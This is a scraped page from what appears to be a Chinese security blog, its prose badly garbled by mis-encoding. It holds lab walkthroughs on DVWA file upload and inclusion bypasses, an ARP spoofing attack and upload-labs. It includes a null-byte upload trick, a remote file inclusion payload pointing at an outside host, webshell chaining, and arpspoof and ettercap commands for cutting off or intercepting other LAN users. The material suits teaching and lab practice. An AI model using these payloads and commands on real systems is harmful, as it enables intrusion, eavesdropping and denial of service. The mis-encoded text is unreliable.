         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$uploaded_ext</span> <span class="token operator">==</span> <span class="token string">"jpg"</span> <span class="token operator">||</span> <span class="token variable">$uploaded_ext</span> <span class="token operator">==</span> <span class="token string">"JPG"</span> <span class="token operator">||</span> <span class="token variable">$uploaded_ext</span> <span class="token operator">==</span> <span class="token string">"jpeg"</span> <span class="token operator">||</span> <span class="token variable">$uploaded_ext</span> <span class="token operator">==</span> <span class="token string">"JPEG"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$uploaded_size</span> <span class="token operator">&lt;</span> <span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;          </span>
             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;                                        echo </span><span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>           
                 <span class="token keyword">echo</span> <span class="token string">'Your image was not uploaded.'</span><span class="token punctuation">;</span>           
                 <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>                  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
             <span class="token keyword">else</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;                   </span>
                 <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>           
                 <span class="token keyword">echo</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token string">' succesfully uploaded!'</span><span class="token punctuation">;</span>          
                 <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>                     
             <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;       </span>
         <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;             </span>
         <span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;                 </span>
             <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>         
             <span class="token keyword">echo</span> <span class="token string">'Your image was not uploaded.'</span><span class="token punctuation">;</span>         
             <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>       
         <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;     </span>
     <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
<span class="token delimiter">?></span> </code></pre>
<p>ä»æºç å¯ä»¥çœ‹å‡ºï¼Œè¿™æ¬¡æ˜¯å¯¹åç¼€è¿›è¡Œæ£€æµ‹ï¼Œæ˜¯jpgæ ¼å¼çš„æ–‡ä»¶æ‰èƒ½ä¸Šä¼ ã€‚</p>
<p>è¿™é‡Œå¯ä»¥åˆ©ç”¨00æˆªæ–­è¿›è¡Œç»•è¿‡ï¼Œåœ¨burpé‡Œæ‹¦æˆªè¯·æ±‚åŒ…ï¼ŒæŠŠfox.phpæ”¹æˆfox.php.jpgã€‚ç„¶åè½¬æˆHexæ˜¾ç¤ºæ ¼å¼ï¼Œæ‰¾åˆ°å¯¹åº”çš„è¿™ä¸€è¡ŒæŠŠ.å¯¹åº”çš„2e æ”¹æˆ 00ã€‚ç„¶åå‘é€è¯·æ±‚åŒ…ï¼Œå°±å¯æˆåŠŸç»•è¿‡ã€‚</p>
<p>æ³¨ï¼šè¿™é‡Œphpçš„ç‰ˆæœ¬å¿…é¡»æ˜¯5.5ä»¥ä¸‹ã€‚</p>
<h3 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h3><p>æ–‡ä»¶åŒ…å«åˆ†ä¸ºLFI(Local File Inclusion)æœ¬åœ°æ–‡ä»¶åŒ…å«å’ŒRFI(Remote File Inclusion)è¿œç¨‹æ–‡ä»¶åŒ…å«ã€‚</p>
<p>æ³¨ï¼šä¸€èˆ¬ç½‘ç«™éƒ½ä¸ä¼šå¼€æ”¾è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œå› ä¸ºå¤ªå±é™©äº†ã€‚</p>
<p>â‘ Low</p>
<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>   
 <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//The page we wish to display </span>
 <span class="token delimiter">?></span> </code></pre>
<p>å¯¹åŒ…å«çš„æ–‡ä»¶æ²¡æœ‰åšä»»ä½•çš„é™åˆ¶ï¼Œæ‰€ä»¥å¯ä»¥è¯»å–äº›æ•æ„Ÿç›®å½•å¦‚ï¼š/etc/passwd</p>
<p>å¯ä»¥ç»“åˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå…ˆåœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´é‚£ä¸Šä¼ ä¸€å¼ å›¾ç‰‡é©¬ï¼Œç„¶ååˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è¿›è¡Œè§£æï¼Œä¸Šä¼ webshellã€‚</p>
<p>â‘¡Medium</p>
<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>   
 <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// The page we wish to display    // Bad input validation   </span>
 <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//", "", $file);   </span>
 <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span>"https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//", "", $file);     </span>
 <span class="token delimiter">?></span> </code></pre>
<p>è¿™é‡Œæœ¬åœ°åŒ…å«æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯æŠŠhttp://å’Œhttps://æ›¿æ¢æˆç©ºã€‚çœ‹ä¼¼ä¸èƒ½è¿›è¡Œè¿œç¨‹åŒ…å«ï¼Œä½†å’ŒSQLæ³¨å…¥ç»•è¿‡ä¸€æ ·ï¼Œè¿›è¡Œå åŠ å³å¯ç»•è¿‡ã€‚</p>
<p>#example:  httphttp://://x.x.x/1.txt</p>
<p>å¯ä»¥ç”¨è‡ªå·±çš„kaliæ¥å½“å¦ä¸€å°æœåŠ¡å™¨è§’è‰²ï¼Œåœ¨kalié‡Œå¯åŠ¨apacheæœåŠ¡ï¼Œåœ¨ç‰©ç†æœºä¸Šè¿›è¡Œè®¿é—®(è®¿é—®kaliçš„ipï¼Œå¯ä»¥è®¿é—®åˆ°apacheçš„é¡µé¢ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœ‰)ï¼Œç„¶ååœ¨var/www/htmlä¸‹éšä¾¿å†™ä¸ªæ–‡ä»¶ä¿å­˜ã€‚å†åœ¨ç‰©ç†æœºä¸Šå¦‚æœå¯ä»¥è®¿é—®åˆ°å°±æ²¡é—®é¢˜ã€‚å†å»é¶åœºè¿›è¡Œè¿œç¨‹æ–‡ä»¶åŒ…å«ã€‚</p>
<p>æ³¨ï¼š</p>
<p>åœ¨php.iniä¸­ï¼Œallow_url_include å’Œallow_url_uploadéƒ½è¦è®¾ä¸ºOnã€‚</p>
<p>â‘ High</p>
<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>       
 <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//The page we wish to display    // Only allow include.php   </span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string">"include.php"</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;     </span>
 <span class="token keyword">echo</span> <span class="token string">"ERROR: File not found!"</span><span class="token punctuation">;</span>     
 exit<span class="token punctuation">;</span>   <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;     </span>
 <span class="token delimiter">?></span> </code></pre>
<p>è¿™é‡Œå°±æ˜¯é™åˆ¶çš„å¾ˆæ­»ï¼Œåªèƒ½åŒ…å«include.phpã€‚è¿™æ ·å†™ï¼Œå°±åƒé“æ¡¶ä¿æŠ¤ä¸€æ ·ï¼Œä½†æ˜¯çµæ´»æ€§å¾ˆå·®ã€‚åæœŸä¿®æ”¹ä»£ç ï¼Œç»´æŠ¤æ¯”è¾ƒä¸æ–¹ä¾¿ã€‚</p>
<p>##å¦‚æœæœ‰å¤§ä½¬å¯ä»¥ç»•è¿‡è¿™ä¸ªHighï¼Œå¯ä»¥è”ç³»ä½œè€…æœ‰å¿ï¼</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2020/12/28/ARP%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/">
                ARPæ¬ºéª—å®éªŒ
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2020-12-28</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h3 id="è¿™æ¬¡å®éªŒçš„ç›®çš„æ˜¯å¯¹å±€åŸŸç½‘å†…å…¶ä»–è®¾å¤‡è¿›è¡Œæ–­ç½‘æ“ä½œï¼ŒåŠè€…ç›‘å¬æ“ä½œã€‚"><a href="#è¿™æ¬¡å®éªŒçš„ç›®çš„æ˜¯å¯¹å±€åŸŸç½‘å†…å…¶ä»–è®¾å¤‡è¿›è¡Œæ–­ç½‘æ“ä½œï¼ŒåŠè€…ç›‘å¬æ“ä½œã€‚" class="headerlink" title="è¿™æ¬¡å®éªŒçš„ç›®çš„æ˜¯å¯¹å±€åŸŸç½‘å†…å…¶ä»–è®¾å¤‡è¿›è¡Œæ–­ç½‘æ“ä½œï¼ŒåŠè€…ç›‘å¬æ“ä½œã€‚"></a>è¿™æ¬¡å®éªŒçš„ç›®çš„æ˜¯å¯¹å±€åŸŸç½‘å†…å…¶ä»–è®¾å¤‡è¿›è¡Œæ–­ç½‘æ“ä½œï¼ŒåŠè€…ç›‘å¬æ“ä½œã€‚</h3><h4 id="ç®€å•åˆ†æä¸‹ARPåè®®"><a href="#ç®€å•åˆ†æä¸‹ARPåè®®" class="headerlink" title="ç®€å•åˆ†æä¸‹ARPåè®®"></a>ç®€å•åˆ†æä¸‹ARPåè®®</h4><p>ARP(Address Resolution Protocol)åœ°å€è§£æåè®®ï¼Œæ˜¯æ ¹æ®IPåœ°å€è·å–å…¶ç‰©ç†åœ°å€/MACåœ°å€(ç¡¬ä»¶åœ°å€)çš„ä¸€ä¸ªTCP/IPåè®®ã€‚å®ƒçš„ä½œç”¨æ˜¯è®©å±€åŸŸç½‘å†…çš„è®¾å¤‡å¯ä»¥æ­£å¸¸äº’ç›¸é€šä¿¡ã€‚åœ°å€è§£æåè®®æ˜¯å»ºç«‹åœ¨ç½‘ç»œä¸­å„ä¸ªä¸»æœºäº’ç›¸ä¿¡ä»»çš„åŸºç¡€ä¸Šçš„ã€‚<u><em>æ‰€ä»¥å­˜åœ¨ä¸€ä¸ªç¼ºç‚¹</em></u>ï¼Œå±€åŸŸç½‘ç»œä¸Šçš„ä¸»æœºå¯ä»¥è‡ªä¸»å‘é€ARPåº”ç­”æ¶ˆæ¯ï¼Œå…¶ä»–ä¸»æœºæ”¶åˆ°åº”ç­”æŠ¥æ–‡æ—¶ä¸ä¼šæ£€æµ‹è¯¥æŠ¥æ–‡çš„çœŸå®æ€§å°±ä¼šå°†å…¶è®°å…¥æœ¬æœºARPç¼“å­˜ï¼›ç”±æ­¤æ”»å‡»è€…å°±å¯ä»¥å‘æŸä¸€ä¸»æœºå‘é€ä¼ªARPåº”ç­”æŠ¥æ–‡ï¼Œä½¿å…¶å‘é€çš„ä¿¡æ¯æ— æ³•åˆ°è¾¾é¢„æœŸçš„ä¸»æœºæˆ–åˆ°è¾¾é”™è¯¯çš„ä¸»æœºï¼Œè¿™å°±æ„æˆäº†ä¸€ä¸ªARPæ¬ºéª—(ARPspoofing)ã€‚</p>
<h4 id="å±€åŸŸç½‘å†…ä¸¤å°è®¾å¤‡å¦‚ä½•é€šä¿¡çš„å‘¢ï¼Ÿ"><a href="#å±€åŸŸç½‘å†…ä¸¤å°è®¾å¤‡å¦‚ä½•é€šä¿¡çš„å‘¢ï¼Ÿ" class="headerlink" title="å±€åŸŸç½‘å†…ä¸¤å°è®¾å¤‡å¦‚ä½•é€šä¿¡çš„å‘¢ï¼Ÿ"></a>å±€åŸŸç½‘å†…ä¸¤å°è®¾å¤‡å¦‚ä½•é€šä¿¡çš„å‘¢ï¼Ÿ</h4><p>å±€åŸŸç½‘é—´çš„ä¸¤å°è®¾å¤‡è¿›è¡Œé€šä¿¡ä¸æ˜¯é€šè¿‡IPåœ°å€ï¼Œè€Œæ˜¯é€šè¿‡MACåœ°å€ã€‚</p>
<p>å±€åŸŸç½‘å†…æœ‰3å°è®¾å¤‡A,B,Cã€‚Açš„IPåœ°å€ä¸º192.168.1.1ï¼ŒMACåœ°å€ä¸º01-01-01-01-01-01ã€‚Bçš„IPåœ°å€ä¸º192.168.1.2ï¼ŒMACåœ°å€ä¸º02-02-02-02-02-02ã€‚å¦‚æœçŸ¥é“äº†å¯¹æ–¹çš„MACåœ°å€ï¼ˆMACåœ°å€å°±åƒæ˜¯èº«ä»½è¯ï¼ŒIPåœ°å€å°±åƒæ˜¯å§“åï¼Œåå­—ä¸€æ ·çš„äººå¾ˆå¤šï¼Œä½†èº«ä»½è¯æ˜¯å”¯ä¸€çš„ï¼‰ï¼Œå°±å¯ä»¥è¿›è¡Œé€šä¿¡äº†ã€‚å¦‚æœä¸çŸ¥é“å¯¹æ–¹çš„MACåœ°å€æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>ä¹‹æ—¶Aä¼šå‘é€ä¸€ä¸ªARPè¯·æ±‚æŠ¥æ–‡ï¼Œé‡Œé¢åŒ…æ‹¬äº†æºIPåœ°å€(Açš„IP)ï¼ŒæºMACåœ°å€ã€‚ç›®çš„IPåœ°å€(Bçš„IP)ï¼Œç›®çš„MACåœ°å€(ä½†æ­¤æ—¶ä¸çŸ¥é“å¯¹æ–¹çš„MACåœ°å€ï¼Œå°±ä¼šè®¾ä¸ºå¹¿æ’­åœ°å€FF-FF-FF-FF-FF-FF)ã€‚å‘é€ç»™äº¤æ¢æœºï¼Œäº¤æ¢æœºè¿›è¡Œå±€åŸŸç½‘å†…çš„å¹¿æ’­ï¼Œè¿™ä¸ªIPåœ°å€æ˜¯è°çš„ï¼ŒCçœ‹åˆ°å‘ç°ä¸æ˜¯è‡ªå·±çš„IPåœ°å€å°±ä¼šä¸¢å¼ƒæ‰ï¼ŒBå‘ç°æ˜¯è‡ªå·±çš„å°±ä¼šæ¥æ”¶ï¼Œå¹¶æŠŠè‡ªå·±çš„MACåœ°å€åº”ç­”å›å»ã€‚æ­¤æ—¶åº”ç­”å°±ä¸æ˜¯å¹¿æ’­ï¼Œè€Œæ˜¯å•æ’­ã€‚æŠŠARPåº”ç­”æŠ¥æ–‡å‘é€ç»™äº¤æ¢æœºï¼Œäº¤æ¢æœºå†è½¬å‘ç»™Aã€‚è¿™æ ·Açš„ARPç¼“å­˜è¡¨é‡Œå°±æœ‰Bçš„MACåœ°å€ã€‚</p>
<h4 id="ARPæ¬ºéª—-ä¸­é—´äººæ”»å‡»ä¸­çš„ä¸€ç§-æ€ä¹ˆå®ç°å‘¢ï¼Ÿ"><a href="#ARPæ¬ºéª—-ä¸­é—´äººæ”»å‡»ä¸­çš„ä¸€ç§-æ€ä¹ˆå®ç°å‘¢ï¼Ÿ" class="headerlink" title="ARPæ¬ºéª—(ä¸­é—´äººæ”»å‡»ä¸­çš„ä¸€ç§)æ€ä¹ˆå®ç°å‘¢ï¼Ÿ"></a>ARPæ¬ºéª—(ä¸­é—´äººæ”»å‡»ä¸­çš„ä¸€ç§)æ€ä¹ˆå®ç°å‘¢ï¼Ÿ</h4><p>å‘ç°Aå’ŒBè¿›è¡Œé€šä¿¡æ—¶ï¼Œæœ‰ä¸ªä¸­é—´äººè¿›è¡Œè½¬å‘å°±æ˜¯äº¤æ¢æœºã€‚è€ŒARPæœ‰ä¸ªç¼ºç‚¹ï¼Œå°±æ˜¯ä¸ä¼šæ£€æµ‹æŠ¥æ–‡çš„çœŸå®æ€§å°±ä¼šæ¥æ”¶ã€‚</p>
<p>å‡å¦‚Cè¦çŸ¥é“Aå’ŒBä¹‹é—´åœ¨å¹²å•¥æ€ä¹ˆåŠå‘¢ï¼ŸCå¯ä»¥å‘é€ä¸€ä¸ªåº”ç­”æŠ¥æ–‡ç»™A(IPä¸ºäº¤æ¢æœºçš„IPï¼ŒMACåœ°å€ä¸ºCçš„ACKåœ°å€)ã€‚è¿™æ—¶Aå°±ä¼šè®¤ä¸ºï¼ŒCæ˜¯è½¬å‘äººå‘˜ï¼ŒæŠŠä¼ ç»™Bçš„ä¿¡æ¯ä¼ ç»™Cï¼ŒCå¯ä»¥å…ˆæŠŠä¿¡æ¯å†…å®¹å­˜èµ·æ¥å†è½¬å‘ç»™Bã€‚å¯¹Bä¹Ÿè¿›è¡ŒåŒæ ·çš„æ“ä½œï¼Œå°±å¯ä»¥çŸ¥é“Aå’ŒBä¹‹é—´åœ¨å¹²å•¥äº†ï¼Œè¾¾åˆ°äº†çªƒå¬çš„æ•ˆæœã€‚</p>
<p>æ–­ç½‘å°±æ˜¯ç»™Aä¸€ä¸ªå‡çš„MACåœ°å€ï¼Œè¿›è¡Œé‡å®šæ€§ã€‚è¿™æ ·Aå°±ä¸Šç½‘ä¸äº†ã€‚å½“ç„¶æ–­ç½‘æ²¡æœ‰æ„æ€ï¼ŒARPæ¬ºéª—ä¸»è¦æ˜¯ç”¨æ¥ç›‘å¬ï¼ŒæŒ‚é©¬ç­‰æ“ä½œã€‚</p>
<h4 id="å¦‚ä½•è¿›è¡Œæ–­ç½‘ã€ç›‘å¬æ“ä½œå‘¢ï¼Ÿ"><a href="#å¦‚ä½•è¿›è¡Œæ–­ç½‘ã€ç›‘å¬æ“ä½œå‘¢ï¼Ÿ" class="headerlink" title="å¦‚ä½•è¿›è¡Œæ–­ç½‘ã€ç›‘å¬æ“ä½œå‘¢ï¼Ÿ"></a>å¦‚ä½•è¿›è¡Œæ–­ç½‘ã€ç›‘å¬æ“ä½œå‘¢ï¼Ÿ</h4><p><u><em>å‰æï¼šé¡»åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘ä¸‹ï¼ŒçŸ¥é“å¯¹æ–¹çš„IPã€‚</em></u></p>
<p>ä½¿ç”¨kaliä½œä¸ºæ”»å‡»æœºã€‚ç½‘ç»œè¿æ¥æ¨¡å¼è®¾ä¸ºæ¡¥æ¥æ¨¡å¼ã€‚</p>
<p>å…ˆifconfigæŸ¥è¯¢è‡ªå·±çš„ç½‘æ®µ(192.168.1.  )åŠç½‘å¡ä¿¡æ¯(ä¾‹å¦‚ eth0)</p>
<p>ä½¿ç”¨nmapæ‰«æå‡ºï¼ŒåŒç½‘æ®µä¸‹å­˜æ´»çš„ä¸»æœºIPã€‚</p>
<p>åœ¨kaliç»ˆç«¯è¾“å…¥ route -n å¯ä»¥æŸ¥è¯¢ç½‘å…³</p>
<h4 id="ä¸ºå•¥è¦æŸ¥è¯¢ç½‘å…³å‘¢ï¼Ÿ"><a href="#ä¸ºå•¥è¦æŸ¥è¯¢ç½‘å…³å‘¢ï¼Ÿ" class="headerlink" title="ä¸ºå•¥è¦æŸ¥è¯¢ç½‘å…³å‘¢ï¼Ÿ"></a>ä¸ºå•¥è¦æŸ¥è¯¢ç½‘å…³å‘¢ï¼Ÿ</h4><p>ä¸€å°å±€åŸŸç½‘ä¸‹çš„æœºå­ï¼Œå¦‚ä½•è®¿é—®å¤–ç½‘çš„èµ„æºå‘¢ï¼Ÿå¦‚å›¾</p>
<p><img src="/images/11.png"></p>
<p>ä¼šå…ˆç»è¿‡äº¤æ¢æœºï¼Œå†ç»è¿‡ç½‘å…³ï¼Œç”±ç½‘å…³å‘å¤–ç•Œå‘é€ä¿¡æ¯ï¼Œæœ€åå†åŸè·¯è¿”å›ã€‚</p>
<p>æ–­ç½‘æ“ä½œï¼Œéª—å–æœºå­ç½‘å…³çš„MACåœ°å€æ˜¯ä½ çš„MACåœ°å€ï¼Œæˆ–è€…æ˜¯ä¸å­˜åœ¨çš„MACåœ°å€ã€‚è®©æ•°æ®åŒ…èµ°åŠ¿å¦‚å›¾</p>
<p><img src="/images/12.png"></p>
<p>è¾“å…¥ arpspoof -i eth0 -t ç›®æ ‡IP   ç½‘å…³</p>
<p>è¿™æ ·å—å®³æœºå­ï¼Œå°±æ°¸è¿œå‘ä¸å‡ºåŒ…ï¼Œä¹Ÿå°±æ”¶ä¸åˆ°åº”ç­”åŒ…ã€‚å°±ä¸Šä¸äº†ç½‘ã€‚</p>
<p>ç›‘å¬ï¼Œè®©å¯¹æ–¹èƒ½æ­£å¸¸ä¸Šç½‘ã€‚ä½†åœ¨ç½‘ç«™ä¸Šæ“ä½œçš„æ•°æ®ä¼šè¢«ä½ çªƒå–èµ°ã€‚</p>
<p>#éœ€å…ˆæ‰“å¼€IPè½¬å‘åŠŸèƒ½ã€‚kalié»˜è®¤æ˜¯å…³é—­çš„ã€‚æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å¼€å¯IPè½¬å‘åŠŸèƒ½</p>
<p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</p>
<p>å†è¿›è¡Œä»¥ä¸‹æ“ä½œ</p>
<p>arpspoof -i eth0 -t ç›®æ ‡IP   ç½‘å…³</p>
<p>ettercap -Tq -i eth0</p>
<p>å°±å¯å¼€å¯å¯¹ç›®æ ‡æœºå­çš„ç›‘å¬äº†ã€‚</p>
<h4 id="æœ€åå†é™„ä¸Šä¸¤å¼ å›¾å¸®åŠ©ARPå·¥ä½œåŸç†ï¼Œæ¬ºéª—åŸç†ã€‚"><a href="#æœ€åå†é™„ä¸Šä¸¤å¼ å›¾å¸®åŠ©ARPå·¥ä½œåŸç†ï¼Œæ¬ºéª—åŸç†ã€‚" class="headerlink" title="æœ€åå†é™„ä¸Šä¸¤å¼ å›¾å¸®åŠ©ARPå·¥ä½œåŸç†ï¼Œæ¬ºéª—åŸç†ã€‚"></a>æœ€åå†é™„ä¸Šä¸¤å¼ å›¾å¸®åŠ©ARPå·¥ä½œåŸç†ï¼Œæ¬ºéª—åŸç†ã€‚</h4><p><img src="/images/9.png"></p>
<p><img src="/images/10.png"></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2020/12/22/Uplaod-labs/">
                Uplaod-labs
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2020-12-22</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p>   ç¯å¢ƒ</p>
<p>apache2.4</p>
<p>php5.2 å’Œ php7.3 ï¼ˆæœ‰äº›å…³éœ€è¦ç‰ˆæœ¬ä¸ä¸€æ ·ï¼‰</p>
<p>webshell èœåˆ€ ï¼ˆèšå‰‘ä½ç‰ˆæœ¬phpä¸æ‡‚å•¥åŸå› è¿ä¸ä¸Šï¼‰       </p>
<h3 id="0x01"><a href="#0x01" class="headerlink" title="#0x01"></a>#0x01</h3><p>å…ˆä¸Šä¼ ä¸€ä¸ªfox.phpçš„æœ¨é©¬æ–‡ä»¶ï¼Œå‘ç°è¢«æ‹¦æˆªä¸‹æ¥<u><em>è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ .jpg|.png|.gifç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š.php</em></u>ã€‚å°è¯•æŒ‚burpä¿®æ”¹httpè¯·æ±‚åŒ…ã€‚</p>
<p>å‘ç°å¹¶æ²¡æœ‰æµé‡äº§ç”Ÿå°±è¢«æ‹¦æˆªä¸‹æ¥ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯åœ¨å‰ç«¯å°±å¯¹æ–‡ä»¶æ ¼å¼è¿›è¡Œäº†éªŒè¯ã€‚</p>
<p>æŒ‰F12è°ƒå‡ºå¼€å‘è€…æ¨¡å¼ã€‚æœç´¢form</p>
<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">onsubmit</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>return checkFile()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span>è¯·é€‰æ‹©è¦ä¸Šä¼ çš„å›¾ç‰‡ï¼š<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>input_file<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>upload_file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ä¸Šä¼ <span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span></code></pre>
<p>çœ‹åˆ°è¿™é‡Œæœ‰ä¸ªè§¦å‘äº‹ä»¶onsubmit=â€return checkFile()â€ ç‚¹å‡»æäº¤å°±ä¼šè§¦å‘ï¼Œå‘ç°ä¼šè¿”å›checkFile()å‡½æ•°æœ€åreturnçš„å†…å®¹æ¥éªŒè¯ã€‚</p>
<p> åœ¨ã€Šscript type=â€text/javascriptâ€ã€‹å‘ç°checkFileå‡½æ•°å¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œäº†åç¼€åçš„éªŒè¯ã€‚</p>
<pre class=" language-php"><code class="language-php">  <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
        <span class="token comment" spellcheck="true">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span>
        <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span>
